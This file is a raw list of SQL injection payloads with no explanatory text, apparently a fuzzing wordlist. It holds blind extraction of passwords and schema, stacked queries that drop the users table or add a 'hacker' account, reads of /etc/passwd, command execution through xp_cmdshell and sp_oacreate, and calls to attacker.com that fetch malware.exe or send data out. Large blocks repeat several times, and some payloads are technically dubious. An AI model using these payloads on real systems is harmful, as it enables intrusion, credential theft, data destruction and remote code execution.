SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')=3
SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users WHERE username LIKE '%a%')>0
SELECT * FROM products WHERE category='electronics' AND (SELECT SUBSTRING(name, 1, 1) FROM products ORDER BY name ASC LIMIT 1)= 'a'
SELECT * FROM users WHERE username='admin' AND (SELECT IF(SUBSTRING(password, 1, 1)='a', 'true', 'false') FROM users WHERE id=1)='true'
SELECT * FROM users WHERE username='admin' AND (SELECT CASE WHEN (SUBSTRING(password, 1, 1)='a') THEN 'true' ELSE 'false' END FROM users WHERE id=1)='true'
SELECT * FROM users WHERE username='admin' AND (SELECT CONCAT_WS(':', username, password) FROM users WHERE id=1)='admin:password123'
SELECT * FROM users WHERE username='admin' AND LENGTH(database())>5;
SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM information_schema.tables)>0;
SELECT * FROM users WHERE username='admin' AND (SELECT @@version)=5;
SELECT * FROM users WHERE username='admin' AND (SELECT user FROM mysql.user LIMIT 0,1)='root';
SELECT * FROM users WHERE username='admin' AND (SELECT CONCAT_WS(':',username,password) FROM users LIMIT 0,1)='admin:pass123';
SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>1;
SELECT * FROM users WHERE username='admin' AND (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()) LIKE '%users%';
SELECT * FROM users WHERE username='admin' AND (SELECT CONCAT(user,'@',host) FROM mysql.user LIMIT 0,1)='root@localhost';
SELECT * FROM users WHERE username='admin' AND (SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)='id';
SELECT * FROM users WHERE username='admin' AND (SELECT CONCAT_WS(':',username,password) FROM users WHERE id=1)='admin:pass123';
admin'; DROP TABLE users; --
' OR 1=1; SELECT * FROM users; --
admin' OR 1=1; INSERT INTO users (username, password) VALUES ('hacker', 'pass123'); --
FAPyElFB';get-help
FAPyElFB';get-help
FAPyElFB';get-help--
FAPyElFB';get-help#
= 1 UNION SELECT 1,CONVERT(email USING utf8) FROM users WHERE id = 1 INTO OUTFILE 'http://attacker.com/exfil.php'
'; DROP TABLE users;--
'; SELECT COUNT(*) FROM users WHERE username='admin' AND substr(password,1,1)='a'--
'; SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE '' END FROM dual;--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END;--
'; WAITFOR DELAY '0:0:10';--
'; SELECT CASE WHEN (1=1) THEN RAISERROR('Error!', 16, 1) ELSE '' END;--
'; IF EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME='users') SELECT 1 ELSE SELECT 0;--
'; SELECT CASE WHEN (1=1) THEN @@VERSION ELSE '' END;--
'; SELECT CASE WHEN (1=1) THEN db_name() ELSE '' END;--
'; SELECT CASE WHEN (1=1) THEN user ELSE '' END;--
' OR 1=1; SELECT pg_sleep(10) --
' OR 1=1; SELECT @@version; --
' OR 1=1; SELECT LOAD_FILE('/etc/passwd'); --
' OR 1=1; SELECT BENCHMARK(1000000, MD5('testing')); --
' OR 1=1; SELECT COUNT(*) FROM users; --
' OR 1=1; SELECT CONCAT(username, '-', password) FROM users; --
' OR 1=1; SELECT * FROM information_schema.tables; --
' OR 1=1; SELECT @@hostname; --
' OR 1=1; SELECT CURDATE(); --
' OR 1=1; SELECT SLEEP(5); --
'; EXEC master..xp_cmdshell 'ping 8.8.8.8';--
'; EXEC sp_oacreate 'WScript.Shell', @shell OUT; EXEC sp_oamethod @shell, 'Run', NULL, 'cmd.exe /c ping 8.8.8.8', NULL;--
'; EXEC xp_dirtree '\\\\attacker.com\\share';--
'; CREATE TABLE [dbo].[tmp](content [varchar](max)); INSERT INTO [dbo].[tmp] EXEC sp_oacreate 'MSXML2.ServerXMLHTTP.6.0', @xml OUT; EXEC sp_oamethod @xml, 'open', NULL, 'GET', 'http://attacker.com/malware.exe', false; EXEC sp_oamethod @xml, 'send', NULL; EXEC sp_oamethod @xml, 'responseBody', @response OUT; INSERT INTO [dbo].[tmp](content) VALUES(@response); DROP TABLE [dbo].[tmp];--
'; DECLARE @cmd varchar(1000); SET @cmd='cmd.exe /c ping 8.8.8.8'; EXEC master..xp_cmdshell @cmd;--
'; SELECT CONVERT(INT, CHAR(71)+CHAR(79)+CHAR(79)+CHAR(68));--
= 1 UNION SELECT 1,CONVERT(email USING utf8) FROM users WHERE id = 1 INTO OUTFILE 'http://attacker.com/exfil.php'
SELECT username, password FROM users WHERE id = 1 UNION SELECT 1,CONVERT(domain USING utf8) FROM information_schema.domains WHERE domain LIKE '%.com' INTO OUTFILE 'dnsquery.php'
SELECT username, password FROM users WHERE id = 1 UNION SELECT 1,CONVERT(email USING utf8) FROM users WHERE id = 1 INTO OUTFILE 'mailquery.php'
SELECT username, password FROM users WHERE id = 1 UNION SELECT username, password FROM users WHERE id = 2
SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'mydatabase' UNION SELECT username, password FROM users WHERE id = 1
SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'mydatabase'
SELECT username, password FROM users WHERE id = 1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users' ORDER BY 1
SELECT username, password FROM users WHERE id = 1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users' LIMIT 1,1
SELECT username, password FROM users WHERE id = 1 UNION SELECT username, password FROM users WHERE username = 'admin' #
SELECT username, password FROM users WHERE id = 1 UNION SELECT username, password FROM users WHERE username = 'admin'/*
SELECT username, password FROM users WHERE id = (SELECT id FROM users WHERE username = 'admin')
SELECT username, password FROM users WHERE id = 1 UNION SELECT username, password FROM users WHERE username = 'admin%00'
SELECT username, password FROM users WHERE id = 1 AND SUBSTRING((SELECT username FROM users WHERE id = 1),1,1) = 'a'
SELECT * FROM users WHERE username='admin' AND SUBSTRING(password, 1, 1)='a'
SELECT * FROM products WHERE category='electronics' AND (SELECT ASCII(SUBSTRING(name, 1, 1)) FROM products LIMIT 1 OFFSET 0)=101
SELECT * FROM users WHERE email='test@test.com' AND SUBSTRING((SELECT password FROM users WHERE id=1), 1, 1)='a'
SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM information_schema.tables)=0
SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')=3
SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users WHERE username LIKE '%a%')>0
SELECT * FROM products WHERE category='electronics' AND (SELECT SUBSTRING(name, 1, 1) FROM products ORDER BY name ASC LIMIT 1)= 'a'
SELECT * FROM users WHERE username='admin' AND (SELECT IF(SUBSTRING(password, 1, 1)='a', 'true', 'false') FROM users WHERE id=1)='true'
SELECT * FROM users WHERE username='admin' AND (SELECT CASE WHEN (SUBSTRING(password, 1, 1)='a') THEN 'true' ELSE 'false' END FROM users WHERE id=1)='true'
SELECT * FROM users WHERE username='admin' AND (SELECT CONCAT_WS(':', username, password) FROM users WHERE id=1)='admin:password123'
SELECT * FROM users WHERE username='admin' AND LENGTH(database())>5;
SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM information_schema.tables)>0;
SELECT * FROM users WHERE username='admin' AND (SELECT @@version)=5;
SELECT * FROM users WHERE username='admin' AND (SELECT user FROM mysql.user LIMIT 0,1)='root';
SELECT * FROM users WHERE username='admin' AND (SELECT CONCAT_WS(':',username,password) FROM users LIMIT 0,1)='admin:pass123';
SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>1;
SELECT * FROM users WHERE username='admin' AND (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()) LIKE '%users%';
SELECT * FROM users WHERE username='admin' AND (SELECT CONCAT(user,'@',host) FROM mysql.user LIMIT 0,1)='root@localhost';
SELECT * FROM users WHERE username='admin' AND (SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)='id';
SELECT * FROM users WHERE username='admin' AND (SELECT CONCAT_WS(':',username,password) FROM users WHERE id=1)='admin:pass123';
admin'; DROP TABLE users; --
' OR 1=1; SELECT * FROM users; --
admin' OR 1=1; INSERT INTO users (username, password) VALUES ('hacker', 'pass123'); --
FAPyElFB';get-help
FAPyElFB';get-help
FAPyElFB';get-help--
FAPyElFB';get-help#
= 1 UNION SELECT 1,CONVERT(email USING utf8) FROM users WHERE id = 1 INTO OUTFILE 'http://attacker.com/exfil.php'
'; DROP TABLE users;--
'; SELECT COUNT(*) FROM users WHERE username='admin' AND substr(password,1,1)='a'--
'; SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE '' END FROM dual;--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END;--
'; WAITFOR DELAY '0:0:10';--
'; SELECT CASE WHEN (1=1) THEN RAISERROR('Error!', 16, 1) ELSE '' END;--
'; IF EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME='users') SELECT 1 ELSE SELECT 0;--
'; SELECT CASE WHEN (1=1) THEN @@VERSION ELSE '' END;--
'; SELECT CASE WHEN (1=1) THEN db_name() ELSE '' END;--
'; SELECT CASE WHEN (1=1) THEN user ELSE '' END;--
' OR 1=1; SELECT pg_sleep(10) --
' OR 1=1; SELECT @@version; --
' OR 1=1; SELECT LOAD_FILE('/etc/passwd'); --
' OR 1=1; SELECT BENCHMARK(1000000, MD5('testing')); --
' OR 1=1; SELECT COUNT(*) FROM users; --
' OR 1=1; SELECT CONCAT(username, '-', password) FROM users; --
' OR 1=1; SELECT * FROM information_schema.tables; --
' OR 1=1; SELECT @@hostname; --
' OR 1=1; SELECT CURDATE(); --
' OR 1=1; SELECT SLEEP(5); --
'; EXEC master..xp_cmdshell 'ping 8.8.8.8';--
'; EXEC sp_oacreate 'WScript.Shell', @shell OUT; EXEC sp_oamethod @shell, 'Run', NULL, 'cmd.exe /c ping 8.8.8.8', NULL;--
'; EXEC xp_dirtree '\\\\attacker.com\\share';--
'; CREATE TABLE [dbo].[tmp](content [varchar](max)); INSERT INTO [dbo].[tmp] EXEC sp_oacreate 'MSXML2.ServerXMLHTTP.6.0', @xml OUT; EXEC sp_oamethod @xml, 'open', NULL, 'GET', 'http://attacker.com/malware.exe', false; EXEC sp_oamethod @xml, 'send', NULL; EXEC sp_oamethod @xml, 'responseBody', @response OUT; INSERT INTO [dbo].[tmp](content) VALUES(@response); DROP TABLE [dbo].[tmp];--
'; DECLARE @cmd varchar(1000); SET @cmd='cmd.exe /c ping 8.8.8.8'; EXEC master..xp_cmdshell @cmd;--
'; SELECT CONVERT(INT, CHAR(71)+CHAR(79)+CHAR(79)+CHAR(68));--
= 1 UNION SELECT 1,CONVERT(email USING utf8) FROM users WHERE id = 1 INTO OUTFILE 'http://attacker.com/exfil.php'
SELECT username, password FROM users WHERE id = 1 UNION SELECT 1,CONVERT(domain USING utf8) FROM information_schema.domains WHERE domain LIKE '%.com' INTO OUTFILE 'dnsquery.php'
SELECT username, password FROM users WHERE id = 1 UNION SELECT 1,CONVERT(email USING utf8) FROM users WHERE id = 1 INTO OUTFILE 'mailquery.php'
SELECT username, password FROM users WHERE id = 1 UNION SELECT username, password FROM users WHERE id = 2
SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'mydatabase' UNION SELECT username, password FROM users WHERE id = 1
SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'mydatabase'
SELECT username, password FROM users WHERE id = 1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users' ORDER BY 1
SELECT username, password FROM users WHERE id = 1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users' LIMIT 1,1
SELECT username, password FROM users WHERE id = 1 UNION SELECT username, password FROM users WHERE username = 'admin' #
SELECT username, password FROM users WHERE id = 1 UNION SELECT username, password FROM users WHERE username = 'admin'/*
SELECT username, password FROM users WHERE id = (SELECT id FROM users WHERE username = 'admin')
SELECT username, password FROM users WHERE id = 1 UNION SELECT username, password FROM users WHERE username = 'admin%00'
SELECT username, password FROM users WHERE id = 1 AND SUBSTRING((SELECT username FROM users WHERE id = 1),1,1) = 'a'
SELECT * FROM users WHERE username='admin' AND SUBSTRING(password, 1, 1)='a'
SELECT * FROM products WHERE category='electronics' AND (SELECT ASCII(SUBSTRING(name, 1, 1)) FROM products LIMIT 1 OFFSET 0)=101
SELECT * FROM users WHERE email='test@test.com' AND SUBSTRING((SELECT password FROM users WHERE id=1), 1, 1)='a'
SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM information_schema.tables)=0
SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')=3
SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users WHERE username LIKE '%a%')>0
SELECT * FROM products WHERE category='electronics' AND (SELECT SUBSTRING(name, 1, 1) FROM products ORDER BY name ASC LIMIT 1)= 'a'
SELECT * FROM users WHERE username='admin' AND (SELECT IF(SUBSTRING(password, 1, 1)='a', 'true', 'false') FROM users WHERE id=1)='true'
SELECT * FROM users WHERE username='admin' AND (SELECT CASE WHEN (SUBSTRING(password, 1, 1)='a') THEN 'true' ELSE 'false' END FROM users WHERE id=1)='true'
SELECT * FROM users WHERE username='admin' AND (SELECT CONCAT_WS(':', username, password) FROM users WHERE id=1)='admin:password123'
SELECT * FROM users WHERE username='admin' AND LENGTH(database())>5;
SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM information_schema.tables)>0;
SELECT * FROM users WHERE username='admin' AND (SELECT @@version)=5;
SELECT * FROM users WHERE username='admin' AND (SELECT user FROM mysql.user LIMIT 0,1)='root';
SELECT * FROM users WHERE username='admin' AND (SELECT CONCAT_WS(':',username,password) FROM users LIMIT 0,1)='admin:pass123';
SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>1;
SELECT * FROM users WHERE username='admin' AND (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()) LIKE '%users%';
SELECT * FROM users WHERE username='admin' AND (SELECT CONCAT(user,'@',host) FROM mysql.user LIMIT 0,1)='root@localhost';
SELECT * FROM users WHERE username='admin' AND (SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)='id';
SELECT * FROM users WHERE username='admin' AND (SELECT CONCAT_WS(':',username,password) FROM users WHERE id=1)='admin:pass123';
admin'; DROP TABLE users; --
' OR 1=1; SELECT * FROM users; --
admin' OR 1=1; INSERT INTO users (username, password) VALUES ('hacker', 'pass123'); --
FAPyElFB';get-help
FAPyElFB';get-help
FAPyElFB';get-help--
FAPyElFB';get-help#
= 1 UNION SELECT 1,CONVERT(email USING utf8) FROM users WHERE id = 1 INTO OUTFILE 'http://attacker.com/exfil.php'
'; DROP TABLE users;--
'; SELECT COUNT(*) FROM users WHERE username='admin' AND substr(password,1,1)='a'--
'; SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE '' END FROM dual;--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END;--
'; WAITFOR DELAY '0:0:10';--
'; SELECT CASE WHEN (1=1) THEN RAISERROR('Error!', 16, 1) ELSE '' END;--
'; IF EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME='users') SELECT 1 ELSE SELECT 0;--
'; SELECT CASE WHEN (1=1) THEN @@VERSION ELSE '' END;--
'; SELECT CASE WHEN (1=1) THEN db_name() ELSE '' END;--
'; SELECT CASE WHEN (1=1) THEN user ELSE '' END;--
' OR 1=1; SELECT pg_sleep(10) --
' OR 1=1; SELECT @@version; --
' OR 1=1; SELECT LOAD_FILE('/etc/passwd'); --
' OR 1=1; SELECT BENCHMARK(1000000, MD5('testing')); --
' OR 1=1; SELECT COUNT(*) FROM users; --
' OR 1=1; SELECT CONCAT(username, '-', password) FROM users; --
' OR 1=1; SELECT * FROM information_schema.tables; --
' OR 1=1; SELECT @@hostname; --
' OR 1=1; SELECT CURDATE(); --
' OR 1=1; SELECT SLEEP(5); --
'; EXEC master..xp_cmdshell 'ping 8.8.8.8';--
'; EXEC sp_oacreate 'WScript.Shell', @shell OUT; EXEC sp_oamethod @shell, 'Run', NULL, 'cmd.exe /c ping 8.8.8.8', NULL;--
'; EXEC xp_dirtree '\\\\attacker.com\\share';--
admin'; DROP TABLE users; --
' OR 1=1; SELECT * FROM users; --
admin' OR 1=1; INSERT INTO users (username, password) VALUES ('hacker', 'pass123'); --
FAPyElFB';get-help
FAPyElFB';get-help
FAPyElFB';get-help--
FAPyElFB';get-help#
= 1 UNION SELECT 1,CONVERT(email USING utf8) FROM users WHERE id = 1 INTO OUTFILE 'http://attacker.com/exfil.php'
